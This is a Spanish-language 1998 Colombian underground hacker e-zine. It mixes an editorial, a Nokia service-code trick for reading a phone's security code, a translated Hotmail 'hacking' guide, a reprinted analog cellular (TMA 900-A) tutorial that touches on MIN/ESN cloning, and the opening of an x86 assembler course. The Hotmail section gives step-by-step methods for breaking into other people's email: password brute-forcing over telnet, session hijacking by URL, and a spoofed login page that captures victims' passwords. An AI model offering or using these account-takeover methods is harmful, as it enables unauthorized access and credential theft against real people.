                            *********************************
                            *                               *
                            *            TEMPORAL           *
                            *                               *
                            *                               *
                            *********************************

                        E-zine del mundo underground en Colombia

                                         numero I
                                      Diciembre 1998
                                           (18)

XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

                            http://www.warez.com/users/silence
                                 http://travel.to/silence
                                    mr.silence@usa.net

XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

                     Bueno este es el intento de e-zine en Colombia
                     Aportes y sugerencias bienvenidas...

XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

NOTA:
Todo lo que esta  en este numero es meramente  educativo, no incito  a nadie a usar  lo que se
brinda aqui, ademas algunos de estos textos han sido copiados de otros  autores y/o traducidos 
por mi, si un texto es tuyo y no quieres que  este aqui, dimelo y lo quitare de  la edicion de 
este numero inmediatamente
                                                                               ZeD-wOrLd-EzInE

(y aplica a este e-zine...)

XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

Contenido

- UNO. Editorial ............................ Una corta "carta"
- DOS. Trucos ............................... Un abrebocas
- TRES. Hack News ........................... Guia para hackear hotmail
- CUATRO. Tutorial .......................... Sistemas de telefonia movil celular
- CINCO. Programacion ....................... Curso de Assembler I
- SEIS. Notas al Margen ..................... Que le vamos a hacer es Guindows I
- SIETE. Fin ................................ Breve Despedida
- OCHO. PGP ................................. Llave Publica mR. sILENCE
- NUEVE. Aplicaciones ....................... DOMSCAN.ZIP
- DIEZ. Bye ................................. Punto Final

- Kevin.TXT ................................. Mi aporte a la causa de Kevin Mitnick


XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
UNO                                                                                  Editorial
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX



?Para  que otro e-zine  mas que hable  sobre hack o  sobre phreak en  un momento que a todo el
mundo le dio por creerse, aprender o sencillamente denominarse hacker?  Digamos que a causa de
una pelicula (de igual nombre) y de  otras en las cuales se presenta la, entre comillas, labor
de un hacker, llama la atencion  esa posibilidad de poder  llegar a "controlar" el mundo de la
informacion que es basicamente en el mundo en que vivimos.

Todo empieza despues de leer algun texto en la red que cae de "buenas manos", como yo que debo 
agradecer a la  conocida ISLATORTUGA y  sobre todo a  http://underhack.islatortuga.com  ya que 
fueron mis  primeros textos "under", recuerdo  las tardes en la universidad bajando archivos y 
reenviandolos a mi correo electronico para poderlos leer en casa a falta de disquetes :) bueno 
asi era, y ahora, no puedo negarlo, estoy en las mismas :)))

Continuando con la  editorial, este e-zine busca recoger  inquietudes y textos desde Colombia,
desde el  famoso: ?Aqui si sirve una blue box?  Todo con el fin de  que encontremos un espacio 
de  discusion que  posibilite una  conformacion  de  grupo,  "conocernos" y bueno, porque  no, 
compartir informacion (que creo es basicamente lo que se busca).

Unas cortas  palabras que  termino aqui, hago este trabajo para empezar con  un e-zine como ya 
dije para  Colombia ya que no he encontrado ninguno en la red; de todas maneras esto no quiere
decir  que se  cierre exclusivamente a eso: no,  creo que el objetivo de compartir informacion 
liga a muchas personas y somos parte  de un grupo  heterogeneo y mundial...  (Algo asi como la
Coca Cola) que debe estar informandose continuamente.

                                            --FIN--

P.D. Lamento que los textos por ahora sean recopilacion de informacion de la red... Espero que
     para  la  proxima  los articulos contengan informacion acerca de  Colombia y tambien  que
     ustedes me  colaboren  con lo que saben...  (De todas formas  yo no lo se todo, y  espero 
     nunca llegar a saberlo... se imaginan que aburrido)

P.D.D. El e-zine va sin tildes para que se pueda leer facilmente en cualquier editor de texto.

                                                                                   Mr. Silence
                                                                            mr.silence@usa.net

----------------------------------------------------------------------------------------------

XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
DOS                                                                                     Trucos
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX


Bueno, esta seccion por ahora no deberia llamarse asi, pero que le voy a hacer... Para empezar
con un poco de  phreak,  este espero sea solo una abrebocas,  en proximas ediciones pondre mas 
informacion.

Aun hay gente que no lo sabe entonces por eso lo escribo,  para programar el Nokia 2120, 2160,
6120 se presionan las siguientes teclas:
* 3 0 0 1 # 1 2 3 4 5 (menu)
De esta forma se puede acceder a  informacion del celular como la  programacion de NAM (linea)
numero  serial (y  hay gente que  cobra por  averiguar  esto)  y sobre todo,  (si es lo que le 
interesa) puede  averiguar la  clave  de  seguridad  del  Nokia, esta  combinacion  de  teclas 
funciona aun con el telefono bloqueado... - Si el teclado esta bloqueado... * (menu) ;)


XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
TRES                                                                                 Hack News
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

No son exactamente noticias, solo algunos documentos que podrian ser utiles en su momento. El
texto esta originalmente en ingles, asi que he intentado traducirlo... si hay algun problema 
con los trucos me lo hacen saber...

----------------------------------------------------------------------------------------------
980123 2.44 PM        Guia para hackear Hotmail por SnEzE V.2.0
                                                                    Traducido por: Mr. Silence
----------------------------------------------------------------------------------------------

Hay muchas  formas de hackear Hotmail, pero  solo  voy a escribir  las mejores.  Si algunas de
estas no  funcionan por  favor  escribame a christog@hem1.passagen.se  y yo  evaluare  si esta 
cometiendo algen error o si Hotmail ha cambiado algo...
Recuerde  que  esta informacion es solo para uso educacional y usted no debe  culpar a alguien
por  los da~nos que usted haya causado. Ademas, recuerde que si alguien se da cuenta que usted
ha estado leyendo su cuenta de correo, estara muy disgustado.
Bueno, ahora los hacks...
Aqui estan los que mas me gustan.

____
I_1_I  - Fuerza Bruta hacking

a. Use telnet para conectarse al puerto 110 (Servidor de Hotmail)
b. Escriba USER y luego el nombre del usuario victima.
c. Escriba PASS y luego una contrase~na (password)
d. Repita estos pasos hasta que encuentre la contrase~na correcta.

!. Este es llamado Fuerza bruta hacking y requiere paciencia. Es mejor que intente diferentes
contrase~nas en la pagina de hotmail porque es mas rapido.
____
I_2_I  - La Mejor manera

a. Tome el nombre del usuario victima (usualmente aparece en la casilla de direccion)
b. Escriba " www.hotmail.com/cgi-bin/start/nombre_de_usuario_victima "
c. !Usted esta adentro!

!. Este hack solo funciona si usted esta en la misma red o computador de la victima y si el no
ha cerrado su cuenta (log out)

____
I_3_I  - La forma antigua

a. Vaya a la pagina de hotmail y obtenga una cuenta (si usted no tiene una)
b. Cierrela (log out)
c. Ahora escriba el nombre del usuario victima.
d. Mire en el codigo fuente
e. En la quinta fila usted deberia encontrar "action=alguna_direccion"
f. Copie esa direccion y peguela en la casilla de direcion
g. Usted esta adentro

!. Como  puede  ver, es un  procedimiento  muy largo y la victima  tiene tiempo de cerrar  la 
cuenta.

____
I_4_I  - Otra...

a. Vaya a la pagina principal de hotmail.
b. Copie el codigo fuente
c. Escriba un nuevo codigo HTML con el mismo codigo pero cambiando method=post a method=enter
d. "Mire" la pagina.
e. Cambie la direcion a http://www.hotmail.com/ (ino presione Enter!)
f. Haga que la victima escriba el nombre de usuario y su contrase~na.
g. Mire en el campo de direccion. Ahi lo vera ...&password:algo...

!. Este es el que yo uso, porque me permite saber la contrase~na. (iSi el cierra el navegador
usted puede ver la contrase~na en la carpeta de Historia!)
Yo he hecho un ejemplo de este truco que usted puede usar en: 
hem1.passagen.se/christog/index.htm. iBuena Suerte!

iLEA!
Operadores del sistema de Hotmail han cambiado el sistema asi que la victima puede cerrar  su
cuenta aen si usted esta adentro. Asi que no pierda su tiempo.

Este texto se encuentra en http://hem1.passagen.se/christog/hotmail.htm
Recuerde que esta es la V.2.0.. Vendra mas...

------------------------

Infortunadamente  la pagina  donde estaba este articulo ya fue cerrada, pero los trucos  creo 
que todavia funcionan

En el  proximo  numero otras  maneras de obtener  la contrase~na de  alguien en  Hotmail  con 
JavaScript y HTML (y espero que aun funcionen, hehehe)

XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
CUATRO                                                                                Tutorial
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

?Por que no comenzar en cierta medida con el tema de moda? Los telefonos celulares, este texto
es del e-zine Saqueadores 11



       _/_/_/_/       Sistemas de telefonia movil celular       \_\_\_\_
      _/_/_/_/                     TMA 900-A                     \_\_\_\_
     _/_/_/_/                                                     \_\_\_\_
    _/_/_/_/                 por el Profesor Falken                \_\_\_\_


AVISO: Si alguna persona con animo de conseguir pillar a alguien considera que la  informacion 
       que se  recoge en el  presente  articulo es  delito, que se compre  un  buen  libro  de 
       telefonia.


         EL AUTOR NO SE HACE RESPONSABLE DEL USO DE ESTA INFORMACION


Introduccion
============

    En  este  articulo  vamos  a  explicar  en  que  consiste  la  telefonia  movil   celular, 
profundizando en el sistema TMA 900-A.
    La idea de realizar este articulo nace de la practica inexistencia de informacion sobre el 
sistema  de  telefonia movil  espa?ol en el  ambiente under.  Desde luego que  existen  muchos 
articulos en  otras  muchas  publicaciones sobre telefonia celular,  y los  principios son los 
mismos, pero  como mas  adelante veremos,  en  Espa?a no se usa la  banda de  frecuencias  que 
podemos ver en estos articulos.

    De  ahora en  adelante hablaremos de  TMA, refiriendonos a la telefonia  movil automatica. 
(-A quien se le ocurriria lo de automatica?) :)


Algo de historia
================

    Si, ya se que esto es una revista tecnica, y que la historia es otra cosa,  y bla bla bla. 
Pero a veces es util conocer algo de historia.
    La primera vez que se usaron servicios de radio movil,  o telefonia movil, que viene a ser 
lo mismo, comerciales fue en los  USA (y abusa) alla por los a?os 30.  Por aquel entonces solo 
los usaba, como no, la policia.
    Con el tiempo se mejoraron los sistemas de radio,  apareciendo el concepto de modulacion y 
mejorandose posteriormente los metodos de modulacion.
    -Pero de que sirve tener un terminal movil si no puedo llamar a un telefono fijo?  Aqui es 
donde aparecen los autenticos  servicios de telefonia movil,  por 1946,  aproximadamente.  (-A 
alguien le recuerda algo esta fecha?) ;)
    Despues de  periodos de  mejora de la  calidad  del  servicio (Ja!),  se  automatizan  los 
servicios, dando origen al TMA. Y se desarrollan nuevos sistemas.
    Al principio,  a cada  terminal se  le  asignaba  una frecuencia fija.  Esto es lo  que se 
denomina un sistema no trunking.  -Os imaginais el  caos que se formaria actualmente si  todos 
los telefonos moviles tuvieran asignada una frecuencia fija?
    Pues aqui es donde aparece el sistema celular.


El sistema celular
==================

    La idea  principal del  sistema celular se  basa en la  reutilizacion de  frecuencias.  Se 
define un grupo de frecuencias que pueden ser usadas por todos los terminales moviles.
    Bueno, pero no es la reutilizacion de frecuencias la unica ventaja aportada por el sistema 
celular.  En el  sistema  celular  se  definen ciertas  areas  limitadas en las  que opera  un 
transmisor/receptor. A partir de ahora  llamaremos al tandem  transmisor/receptor EB (Estacion 
Base).
    Veamos, tenemos una  EB en un area.  Esta EB tiene limitada la potencia de  transmision de 
tal forma que no  salga de su area, o  salga ligeramente.  Ademas, esta  EB tiene asignado  un 
conjunto de radiocanales, que  puede ser usado en otro area.  Este conjunto de radiocanales es 
un conjunto de frecuencias, por si no lo sabiais. Para evitar interferencias,  las EB  vecinas
usan conjuntos de frecuencias diferentes.
    Asi tenemos un sistema  que con un rango  limitado de frecuencias  puede manejar un numero 
elevado de  comunicaciones. Este sistema es el sistema celular.  Y si sustituis  en el parrafo 
anterior la palabra area por celula puede que os suene mejor.
    Veamoslo de forma grafica:


          ______          ______               En un pais multicolor,
         /*     \        /      \              nacio una abeja bajo el sol...
        /   EB   \______/   EB   \______       Ups, esto no tiene nada que
        \   C    /      \   B    /      \      ver.
         \______/   EB   \______/   EB   \
         /      \   D    /*     \   A    /     Bueno, co?as aparte, vemos
        /   EB   \______/   EB   \______/      que existe un EB por cada
        \   B    /      \   C    /      \      celula. Ademas, aparecen
         \______/   EB   \______/   EB   \     4 letras, A, B, C, D. Estas
         /      \   A    /      \   D    /     letras representan distintos
        /   EB   \______/   EB   \______/      grupos de frecuencias.
        \   C    /      \   B    /
         \______/        \______/


    Como  podemos observar,  nunca coinciden  dos  grupos de  frecuencias  iguales en  celulas 
adyacentes. Esto se hace asi  para evitar interferencias.  La distancia que separa dos celulas 
que usan el mismo set de frecuencias,  como las marcadas por el asterisco,  viene definida por 
lo que los tecnicos llaman  Distancia de Reutilizacion.  Esta es la distancia minima en la que 
no existen interferencias entre dos comunicaciones que usen la misma frecuencia.

    -Que  sucede si  aumenta el  numero de usuarios  en una celula  de tal forma que no quedan 
frecuencias libres? Muy sencillo, dividimos la celula en otras mas peque?as. Esto es lo que se 
llama fragmentacion celular. Para el ejemplo anterior:

                      ______          ______
                     /      \        /      \
                    /        \______/   __   \______
                    \        /      \__/  \__/      \
                     \______/     __/  \__/  \       \
                     /      \  __/  \__/  \__/       /
                    /        \/  \__/  \__/  \______/
                    \        /\__/  \__/  \__/      \
                     \______/    \__/  \__/  \       \
                     /      \       \__/  \__/       /
                    /        \______/  \__/  \______/
                    \        /      \        /
                     \______/        \______/


    Otra mejora del  servicio consiste en  asignar las frecuencias, a partir de ahora canales, 
de forma  dinamica.  Estos canales podrian estar asignados  de forma fija a un  terminal movil
(TM). De esta forma necesitariamos tantos canales en una celula como TM estan en ella.
    Al  realizar  la  asignacion de forma dinamica,  se  consigue  una  mejor optimizacion del 
servicio, pudiendo existir mas TM en una celula que canales pueda gestionar. Esto es lo que se 
denomina un sistema trunking.

    Existen  otros  dos  servicios,  que aunque similares,  realizan funciones  distintas:  el 
roaming  (seguimiento) y el handover (traspaso). Ambos se encargan de  trasladar la gestion de 
un TM a una celula adyacente cuando el TM se esta moviendo de una celula a otra. La diferencia 
esta  en que  el roaming se hace siempre,  para tener  localizado al  TM  permanentemente.  El 
handover,  por su parte,  se produce en plena  comunicacion, de forma  que el  usuario  "no se 
entere" que se le ha cambiado de canal.

    Para  completar el sistema  existen las Centrales de  Telefonia Movil  (CTM o MSC), que se 
encargan de  realizar las  tareas  de  conmutacion,  interconectando las  EB con la  RTC  (Red 
Telefonica  Conmutada.  Vamos, la  que teneis en casa a  menos que seais unos bichos raros con 
RDSI)


El sistema TMA 900-A
====================

    Despues  de todo  este  rollo  que  parece  pelotero  a  telefonica  pasemos  a  algo  mas 
interesante, el sistema TMA 900-A.  Este es el sistema que usa telefonica en sus TM analogicos 
(MoviLine). Ademas, como detalle curioso,  se usa tambien en algunos  servicios de emergencia. 
Buscad, buscad y os sorprendereis. Pero antes un aviso, estos servicios de  emergencia como es
logico usan una  codificacion por  subtonos en  sus sistemas de comunicacion que usan la malla 
trunking. Los radioaficionados ya sabran por donde voy.
    Bueno, al grano.  El sistema TMA 900-A esta basado en la  especificacion del sistema  TACS 
del Reino Unido, basado este a su vez en el sistema americano AMPS.
    La se?al que se transmite en este sistema se encuentra  modulada en frecuencia (FM) en las 
transmisiones de voz y  tonos de supervision y modulada en FSK en la se~nalizacion de control. 
Aquellos  interesados en un  articulo  sobre la  modulacion,  que lo pidan.  Si interesa me lo 
curro.
    Pero este  sistema no se llama  TMA 900-A porque haya 900 sistemas anteriores, o porque al 
que lo bautizo le dio la gana. Se llama asi por utilizar la banda de 900 MHz.
    Se dispone de 1320 canales duplex (esto quiere decir que permite mantener una comunicacion 
bidireccional simultanea, como un telefono normal).  Estos canales estan separados entre si 25 
KHz. Las portadoras de emision  y de recepcion correspondientes a un mismo canal se encuentran 
separadas a 45 MHz.
    Detallemos un poco mas esta distribucion de canales.
    Las portadoras de emision pertenecen  a una banda de frecuencias que van desde los 884 MHz 
a los 917 MHz. En algunos sitios dicen que van de 890 MHz a 915 MHz, pero calculad:

                915 - 890 = 25 MHz
                25 MHz / 25 KHz = 1000 canales  (25 KHz entre canales)

    Como veis no cuadra. Y es que algunas informaciones...
    Y las portadoras de recepcion se distribuyen desde los 929 MHz a los 962 MHz.  Esto ultimo 
lo podriais haber calculado vostros:

                884 MHz + 45 MHz = 929 MHz
                917 MHz + 45 MHz = 962 MHz  (45 MHz entre portadoras)

    -Ha quedado claro?

    Las EB proporcionan dos tipos de canales:

        - Canal de control -> Usados para la se?alizacion en las llamadas
                              hacia los TM. Tambien conocido por canal de
                              llamada.
        - Canales de trafico -> Son los que mantienen las conversaciones
                                telefonicas. Pueden estar en reposo o
                                libres. (Ya se que suena absurdo, pero
                                luego quedara claro).

    Por  supuesto,  ademas el  sistema TMA 900-A es  un sistema  celular.  Y como tal,  Las EB 
deberan supervisar las comunicaciones de los TM para asegurar su calidad.  Esta supervision la 
realizan  enviando  una  se~nal  piloto  no  audible de  4 KHz desde  la EB.  Esta  se~nal  es 
retransmitida  por el  TM a la EB.  Cuando la  se~nal que recibe la EB pasa por  debajo de  un 
cierto limite de intensidad la MSC ordena medidas en las centrales adyacentes para seleccionar 
aquella en la que el TM tiene mejor se~nal.


Canales en TMA 900-A
====================

    Se  define  como canal al camino entre el  Terminal Movil (TM)  y la Central de  Telefonia 
Movil (CTM o MSC). Un canal esta compuesto de:

        - Una conexion a 4 hilos entre la central MSC y la EB. -Adivinais
          que sistema de transmision usa esta conexion?
        - Un canal de radio entre la EB y el TM, usando una frecuencia para
          transmision y otra para recepcion, tal y como ya se ha visto.

    Asimismo podemos diferenciar los siguientes tipos de canales:

        - Canales de radio -> Usados en la se?alizacion entre la MSC y los
                              TM y en la conversacion:

              - Canal de llamada (CC) -> Llamadas hacia TM.
              - Canal de trafico (TC)
                    - Libre (free-TC) -> Llamada y conversacion hacia TM.
                    - reposo (idle-TC) -> Conversacion hacia TM.
              - Canal combinado (CC/TC) -> Usado indistintamente.

        - Canales de datos -> Solo se usan en la se?alizacion entre la EB
                              y la MSC.

    Cada EB consta  con un unico CC,  siendo el resto TC.  Tanto el canal CC  como los canales 
free-TC se estan identificando continuamente como tales en la zona de cobertura de la EB.
    Los canales idle-TC no son operativos  hasta que no sean asignados  a una llamada dirigida 
hacia un TM.
    Todos los TM cuelgan del unico CC de la EB de su zona de cobertura.


Ejemplos de procedimientos TMA 900-A
====================================

    A  continuacion se  recogen los  procedimientos  que se  siguen en la  mayor parte  de las 
comunicaciones por telefonia TMA 900-A.  Cabe destacar que cualquier  llamada dirigida a un TM 
se comunicara a todas las EB del area de localizacion (AL) donde se  encuentra el TM. El AL lo 
constituyen todas las EB que cuelgan de la misma MSC donde se encuentra el TM.


Llamadas a terminales moviles
-----------------------------

    Una llamada a un TM se constituye de los siguientes pasos:

        - Llamada al TM.
        - Asignacion de un idle-TC al TM.
        - Identificacion del TM.
        - Llamada al abonado.
        - Supervision.

    Esquematicamente:


   MSC                                EB                                 TM
    |                                  |                                  |
    | Canal de llamada (CC)            | Canal de llamada (CC)            |
    |--------------------------------->|--------------------------------->|
    | Llamada (CC)                     | Llamada (CC)                     |
    |--------------------------------->|--------------------------------->|
    |                Confirmacion (CC) |                Confirmacion (CC) |
    |<---------------------------------|<---------------------------------|
    | Inicio de TC (TC)                |                                  |
    |--------------------------------->|                                  |
    |                 TC Iniciado (TC) |                                  |
    |<---------------------------------|                                  |
    | Asignacion de TC (CC)            | Asignacion de TC (CC)            |
    |--------------------------------->|--------------------------------->|
    | Peticion de identificacion (TC)  | Peticion de identificacion (TC)  |
    |--------------------------------->|--------------------------------->|
    |              Identificacion (TC) |              Identificacion (TC) |
    |<---------------------------------|<---------------------------------|
    | Orden de llamada (TC)            | Orden de llamada (TC)            |
    |--------------------------------->|--------------------------------->|
    |                   Respuesta (TC) |                   Respuesta (TC) |
    |<---------------------------------|<---------------------------------|
    | Inicio supervision               |                                  |
    |--------------------------------->|                                  |
    | Calidad de transmision (TC)      |                                  |
    |                                  |                                  |
    |        Supervision iniciada (TC) |                                  |
    |<---------------------------------|                                  |
    |                                  |                                  |
   """                                """                                """


Llamadas desde terminales moviles
---------------------------------

    Los pasos que constituyen una llamada desde un TM son:

        - Llamada desde el TM.
        - Identificar el TM.
        - Marcar las cifras del abonado llamado.
        - Supervision.


   MSC                                EB                                 TM
    |                                  |                                  |
    | Canal de llamada (CC)            | Canal de llamada (CC)            |
    |--------------------------------->|--------------------------------->|
    | Canal FREE-TC                    | Canal FREE-TC                    |
    |--------------------------------->|--------------------------------->|
    |                                  |                                  |
    |                    Llamada (TC)  |                    Llamada (TC)  |
    |<---------------------------------|<---------------------------------|
    | Peticion de identificacion (TC)  | Peticion de identificacion (TC)  |
    |--------------------------------->|--------------------------------->|
    |              Identificacion (TC) |              Identificacion (TC) |
    |<---------------------------------|<---------------------------------|
    | Orden envio cifras (TC)          | Orden envio cifras (TC)          |
    |--------------------------------->|--------------------------------->|
    |                     Cifra 1 (TC) |                     Cifra 1 (TC) |
    |<---------------------------------|<---------------------------------|
    |                     Cifra 2 (TC) |                     Cifra 2 (TC) |
    |<---------------------------------|<---------------------------------|
    :    :    :    :    :    :    :    :    :    :    :    :    :    :    :
    :    :    :    :    :    :    :    :    :    :    :    :    :    :    :
    |                                  |                                  |
    | Marcacion completa (TC)          | Marcacion completa (TC)          |
    |--------------------------------->|--------------------------------->|
    | Inicio supervision               |                                  |
    |--------------------------------->|                                  |
    | Calidad de transmision (TC)      |                                  |
    |                                  |                                  |
    |        Supervision iniciada (TC) |                                  |
    |<---------------------------------|                                  |
    |                                  |                                  |
   """                                """                                """


Procedimiento de cambio de canal
--------------------------------

    Antes de explicar este procedimiento debemos recordar como funciona la supervision.  La EB
 emite  un tono no  audible de  4 KHz  al  TM  continuamente.  El  TM  recibe la  se~nal  y la 
retransmite a la EB.  Entonces la EB  compara la relacion se~nal/ruido (S/N) del tono recibido 
con dos niveles prefijados. Si se la relacion S/N se encuentra por encima del primer nivel, la 
comunicacion sigue de la forma en la que estaba.  Si por el encontrario,  esta por debajo  del 
primer nivel, se inicia el proceso de HANDOVER, o cambio de canal. Pero si esta por debajo del 
segundo nivel, simplemente se corta la comunicacion.
    Los pasos que se siguen a la hora de realizar el handover son:

        - La EB comunica a la MSC que la relacion S/N esta por debajo del
          primer nivel en el TC en uso.
        - La MSC solicita una medida de la relacion S/N de la se?al en todas
          las EB colindantes a la anterior, y a esta misma.
        - La MSC selecciona el TC de la EB con mejor relacion S/N.
        - La MSC informa al TM del cambio.
        - El TM se identifica en el nuevo canal.
        - Supervision.


 MSC                     EB1                      EB2                     TM
  |                       |                        |                       |
  | Supervision (TC)      |                        |                       |
  |<----------------------|                        |                       |
  | Orden medida (TC)     |                        |                       |
  |---------------------->|                        |                       |
  | Orden medida (TC)     |                        |                       |
  |------------------------------------------------|                       |
  | Resultado medida (TC) |                        |                       |
  |<----------------------|                        |                       |
  |                       | Resultado medida (TC)  |                       |
  |<-----------------------------------------------|                       |
  | Inicio de TC (TC*)    |                        |                       |
  |----------------------------------------------->|                       |
  |                       |     TC Iniciado (TC*)  |                       |
  |<-----------------------------------------------|                       |
  |                       | Asignacion de TC* (TC) |                       |
  |----------------------------------------------->|---------------------->|
  |                       |                        |                       |
  | Peticion ID (TC*)     |                        | Peticion ID (TC*)     |
  |----------------------------------------------->|---------------------->|
  |                       |   Identificacion (TC*) |  Identificacion (TC*) |
  |<-----------------------------------------------|<----------------------|
  | Inicio supervision    |                        |                       |
  |----------------------------------------------->|                       |
  | Calidad de            |                        |                       |
  | transmision (TC*)     |                        |                       |
  |                       |         Supervision    |                       |
  |                       |         iniciada (TC*) |                       |
  |<-----------------------------------------------|                       |
  |                       |                        |                       |
  |                       |                        |                       |
 """                     """                      """                     """


Seguimiento (Roaming)
---------------------

    Ya hemos explicado porque es necesario mantener controlado constantemente a un TM.  Cuando 
un TM sale de una celula,  inicia una llamada al MSC  para actualizar el area de localizacion. 
Entonces pueden suceder dos cosas:

           - El TM se encuentra localizado en un area que pertenece a la
             central propia. Entonces la MSC actualiza el registro de
             residentes inscribiendo al TM.
           - El area de localizacion pertenece a otra central que no es la
             propia. Entonces se llama a la central propia para que actualice
             el registro de residentes con el nuevo MSC y el area de
             localizacion. Ademas, se inscribe al TM en el registro de
             visitantes del nuevo AL.


   MSC                                EB                                 TM
    |                                  |                                  |
    | Canal de llamada (CC)            | Canal de llamada (CC)            |
    |--------------------------------->|--------------------------------->|
    |                                  |                                  |
    | Llamada de actualizacion (TC)    | Llamada de actualizacion (TC)    |
    |<---------------------------------|<---------------------------------|
    |                                  |                                  |
    | Peticion de identificacion (TC)  | Peticion de identificacion (TC)  |
    |--------------------------------->|--------------------------------->|
    |                                  |                                  |
    |              Identificacion (TC) |              Identificacion (TC) |
    |<---------------------------------|<---------------------------------|
    |                                  |                                  |
    |                 Desconexion (TC) |                 Desconexion (TC) |
    |<---------------------------------|<---------------------------------|
    |                                  |                                  |
    |                                  |                                  |
   """                                """                                """


-Y como #$@!!?! se identifica un TM?
====================================

    Pues esto es lo mas sencillo.  El aparato lleva consigo un numero de serie denominado ESN, 
ademas  de  almacenar  el  numero  telefonico  asignado o MIN.  De entre  otros datos  que  se 
transmiten en la identificacion, estos dos son los que pueden ser mas utiles.
    Y si estais pensando en hackear un telefono movil, recordad, esta informacion se refiere a 
telefonia  analogica.  No sirve p ara los moviles GSM.  Sobre GSM ya hablaremos en  siguientes 
articulos. Pero lo que os debe quedar muy claro es que hagais lo que hagais es cosa vuestra.
    Seguro que pensais que con  clonar, ahora que esta tan de moda, el chip del movil donde se 
almacena el par MIN/ESN ya podeis llamar como si del movil de otro se tratara.  Bueno, esto es 
cierto  en parte.  Aparte de la identificacion,  las centrales realizan  otros controles.  ?Os 
imaginais a una EB atendiendo a dos  telefonos moviles en la misma celula que  tengan la misma
identificacion? Si el primer movil no tiene autorizado el uso de un segundo movil...


Despedida y cierre (Ta - ta - ta chan !!!)
==========================================

    Como habeis visto,  esta informacion ha sido un poco mas orientada a que  conozcais uno de 
los  sistemas de telefonia  movil  usado en Espa~na  que a ver como  conseguir intervenir  una 
llamada o cosas de esas. De todas formas,  os aseguro que hay informacion de sobra para que si 
lo pensais detenidamente os  deis cuenta de la inseguridad de las comunicaciones  moviles, por 
mucho  que  las  compa~nias  telefonicas  se  empe~nen en  vanagloriarse  de sus  sistemas  de 
codificacion (solo usados en GSM) y demas.
    Ademas, si habeis  leido  algo de telefonia movil en  otras publicaciones,  sobre todo del 
extranjero,  habreis notado que  las frecuencias y algunos procesos son totalmente diferentes. 
Eso se debe a que la Telefonica no es tan tonta como parece, pero si es un tanto ...... bueno, 
mejor no decirlo que luego hay problemas, y ya se sabe.



                                                      Have P/Hun
                                                  El profesor Falken
                                               falken@lettera.skios.es

------------------------

La pagina de el profesor Falken es: http://www.geocities.com/SiliconValley/Lakes/1707/
y de la revista Saqueadores: http://set.net.eu.org/

XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
CINCO                                                                             Programacion
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

Empiezo con un curso de Assembler, extractado de la pagina de la Universidad de Guadalajara.
(Primera entrega...)

------------------------

Introduccion.

El  documento  que  esta  visualizando  tiene  la funcion  primordial  de  introducirlo  a  la 
programacion  en  lenguaje Ensamblador,  y esta  pensado en aquellas  personas que nunca  han 
trabajado con este lenguaje y probablemente con ningon otro.

El tutorial se enfoca  completamente hacia lascomputadoras que  operan con  procesadores de la 
familia x86 de Intel y, considerando que el ensamblador basa su funcionamiento en los recursos 
internos  del  procesador, los  ejemplos  descritos  no  son  compatibles   con  ninguna  otra 
arquitectura.

Se estructuro  la informacion en forma de unidades para permitir el facil acceso a cada uno de 
los topicos y facilitar el seguimiento del tutorial.

En la seccion  introductoria se mencionan  algunos de los conceptos  elementales acerca de los 
sistemas de  computo  asi como del  ensamblador mismo, y continoa con  el tutorial propiamente 
dicho.

Descripcion basica de un sistema de computo.

Esta seccion  tiene como  finalidad dar  una breve  rese~na de  las partes  principales  de un 
sistema de  computo a un nivel basico,  que permita al  usuario un mayor entendimiento  de los 
conceptos que se trataran a lo largo del tutorial.

   * Procesador Central

   * Memoria Central

   * Unidades de Entrada y Salida

   * Unidades de Memoria Auxiliar

Sistema de Computo.

Le llamamos sistema de computo a la configuracion completa de una computadora,  incluyendo las 
unidades  perifericas y la programacion de  sistemas que la hacen un aparato  util y funcional 
para un fin determinado.

Procesador Central.

Esta parte es conocida tambien como  unidad central de procesamiento o UCP.  formada  a su vez 
por la unidad de  control y la unidad aritmetica y logica.  Sus funciones consisten en  leer y 
escribir contenidos  de las celdas de memoria,  llevar y traer datos entre celdas de memoria y 
registros especiales y decodificar y ejecutar las instrucciones de un programa.

